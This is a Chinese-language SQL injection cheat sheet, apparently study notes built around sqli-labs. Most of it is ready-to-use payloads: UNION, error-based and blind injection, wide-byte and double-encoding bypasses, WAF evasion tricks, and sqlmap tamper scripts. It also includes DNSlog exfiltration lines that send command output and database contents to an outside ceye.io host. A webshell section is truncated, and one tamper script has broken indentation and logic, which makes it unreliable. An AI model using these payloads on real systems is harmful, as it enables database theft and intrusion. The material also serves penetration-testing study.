各种注入姿势

UNION手工注入

union的一些限制：

  • union合并多个select语句结果，并列的select需要拥有相同数量的列，数据类型要相似（可以进行类型转换）
  • union all允许重复值
  • 只有最后一个select子句允许order by，limit
  • 要有回显（废话）

原始sql语句：

 1#查库
 2select schema_name from information_schema.schemata
 3
 4#查表
 5select table_name from information_schema.tables where table_schema=库名
 6select table_name from information_schema.tables where table_schema=database()
 7
 8#查列
 9select column_name from information_schema.columns where table_name=表名
10
11#查数据
12select 列名 from 库名.表名
13
14#这些名字可以使用16进制编码来绕过单引号
15#加limit0,1查询第一条
16
17#concat链接多个数据为一条结果
18select groutp_concat(schema_name) from information_schema.schemata

实际注入：

 1#判断几列，看什么时候报错
 21' order by 3 --+
 3
 4#union联合查询回显位，前面的那一段不能返回结果，置为空或者库中不存在的值
 5' union select 1,2,3--+
 6
 7#再在回显位中输入查询的语句，先查库
 89999' union select 1,2,(select schema_name from information_schema.schemata limit 0,1) --+
 9
10#继续查表
119999' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security') --+
12
13#查字段
149999' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') --+
15
16#查数据group_concat会将两个字段拼在一起，concat_ws将两个字段通过分隔符分割开来
179999' union select 1,2,(select concat_ws('~',username,password)from security.users limit 0,1) --+
189999' union select 1,2,(select group_concat(username,'~',password)from security.users) --+

MySQL不能直接执行系统命令，只能通过读写文件来提权，当然需要相关权限：

5
6#写webshell

报错注入

需要有报错回显，目的是让错误信息显示数据库中的内容。下面是让报错信息显示的一些函数：

 1#floor()
 2#group by对rand()函数产生错误
 3select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));
 4
 5#extractvalue()
 6#XPATH语法错误，只会报出不符合语法格式的那部分，所以需要使用concat，且第一位需要是不符合xpath格式的值开头。
 7extractvalue(1,concat(0x7e,(select user()),0x7e))l
 8
 9#updatexml()
10#XPATH语法错误
11select updatexml(1,concat(0x7e,(select user()),0x7e),1);

报错注入对返回的数据有32位的限制，可以使用函数对数据截取：

1#截取1到10位
2substr(concat(0x7e,(select user()),0x7e),1,10)

布尔盲注

页面不会回显数据，也不会回显错误信息，但返回对或错（或者类似的能够判断对错情况）。常用函数：

 1#left(a,b):截取a的前b位
 2id=1 and left((select version()),1)='s' --+
 3
 4#regexp
 5select user() regexp '^r'
 6
 7#like
 8select user() like 'ro%'
 9
10#substr(a,b,c) 将a字符串从b位置开始截取c长度
11#ascii()将字符转化为ascii编码值
12ascii(substr((select database),1,1))=98
13
14#mid(a,b,c) 将字符串a从b开始截取c位
15#ord和ascii一样
16ord(mid((select user()),1,1))=114

时间盲注

页面不会回显数据，也不会回显错误信息，对或错都不能判断，不能通过页面内容判断。这时我们通过响应时长来判断是否执行sql，走了哪条选择支：

1#if(statement,true,false)
2if(left(user()m1)='a',0,sleep(3));
3if(ascii(substr(database(),1,1))>115,0,sleep(5))#

Dnslog盲注

为了应对布尔注入和时间注入得到结果太慢的缺点。Dnslog平台：http://ceye.io/，注册后会给你唯一标识的一个链接。

DNS在解析时会留下日志，通过去读多级域名的解析日志，获取请求的信息。在linux机器上使用如下命令：

1curl `whoami`.r4ourp.ceye.io

会在Dnslog平台上留下解析记录，可以看到解析了dbo.r4ourp.ceye.io，说明whoami的结果是dbo。这样利用同样原理便可以通过Dnslog读取数据库的数据。在MySQL中发起请求：

1select load_file(concat('\\\\','test','.mysql.r4ourp.ceye.io\\abc'));
2
3select load_file(concat('\\\\',(select database()),'.mysql.r4ourp.ceye.io\\abc'));

注意在填入想获取信息的那个地方不能使用一些特殊符号如~@:等，同样的返回值如果有这些符号Dnslog平台上也是不会出现的，可以用hex函数绕过；load_file只能在windows使用，linux不能发起请求。

老师写的Dnslog程序：https://github.com/ADOOO/DnslogSqlinj

防御绕过

宽字节注入

两个字节的是宽字节。一些函数对单引号转义为\‘后不能进行注入，而当MySQL使用GBK编码时，如果第一个Ascii吗大于128，会认为两个字符为一个汉字，这样为了应对\'=%5c%27，我们利用上面这个特性将%5c消灭掉：%df\'=$df%5c%27=運’，这样就可以注入了。

1id=%df' union select 1,(select user()),3--+

条件：

  • GBK编码等类似的宽字节编码（mysql_query(“set names gbk”))
  • 使用了preg_replace或addslashes或mysql_real_escape_string进行转义了

使用sqlmap时可以在这个参数后面加上%df这样就可以检测到了。

1sqlmap -u "http://127.0.0.1/index.php?id=1%df"

防御：

1//1.使用utf-8编码
2
3//2.或者两个一起使用
4mysql_real_escape_string
5mysql_set_charset('gbk',$conn)
6
7//3.设置参数：使用二进制的方式查询
8mysql_query("character_set_client=binary",$sql)

二次编码注入

php本身就要编码解码一次，如果这时再加入urldecode再解码一次，就会造成可以绕过单引号转义的情况。

1id=1%2527 (php编码)-> id=1%27 (转义)-> id=1%27 (urldecode)-> id=1'

具体就是urldecode放在了转义之前，这个利用条件很苛刻，因为本身是不需要自己解码的，php自己会解码。

同理想要使用sqlmap，直接在u参数后面加完事。

二次注入

首先需要插入恶意数据，其次还需要能够查出（要被sql用到）插入的数据。例如先插入带有单引号的数据，虽然会被转义，但是查询出来后就带单引号了。例如注册用户后修改密码，如果用户名是admin'#，这时修改的密码是管理员的密码。注意是看自己能够在什么地方控制什么参数。这种场景要么手工要么自己写利用脚本，不能用sqlmap（大概）。

  1. SQL注释符绕过
    • union/**/select
    • union/*aaaa%01bbs*/select
    • union/aaaaaaaaaaaaaaaaaaa/select

  2. 空白符绕过
    • MySQL空白符：%019,%0A,%0B,%0D,%20,%0C,%A0,/*xxx*/
    • 正则空白符：%09,%0A,%0B,%0D,%20
    • Example:union%250Cselect,union%25A0select
  3. 函数分隔符号
    • concat%2520(
    • concat/**/(
    • concat%250c(
    • concat%25a0(
  4. 浮点数词法解析
    • select * from users where id=8E0union select 1,2,3,4,5
    • select * from users where id=8.0union select 1,2,3,4,5
    • select * from users where id=\Nunion select 1,2,3,4,5
  5. 报错注入
    • extractvalue(1,concat(0x5c,md5(3)));
    • updatexml(1,concat(0x5d,md5(3)),1);

    • polygon((select*from(select name_const(version(),1))x))

Tamper脚本编写

base64encode.py的解读，可见关键的地方只在对payload参数的处理。

 2#!/usr/bin/env python
 3
 4"""
 5Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
 6See the file 'LICENSE' for copying permission
 7"""
 8
 9#sqlmap内部调用
10from lib.core.convert import encodeBase64
11from lib.core.enums import PRIORITY
12
13__priority__ = PRIORITY.LOW
14
15def dependencies():
16    pass
17
18def tamper(payload, **kwargs):
19    """
20    Base64-encodes all characters in a given payload
21
22    >>> tamper("1' AND SLEEP(5)#")
23    'MScgQU5EIFNMRUVQKDUpIw=='
24    """
25
26    return encodeBase64(payload, binary=False) if payload else payload
27

当WAF过滤空格，union select关键字时，可以这样编写脚本：（sqlmap会主动闭合sql语句，不需要担心注释符的过滤如#,-,+,/,*。所以对注释符的过滤可以不用处理。）

1def tamper(payload, **kwargs):
2    """
3    Bypass sqli-labs/Less-28
4    """
5
6	if payload:
7		payload = payload.replace('union select','union all select').replace('','%0a')
8    	return payload
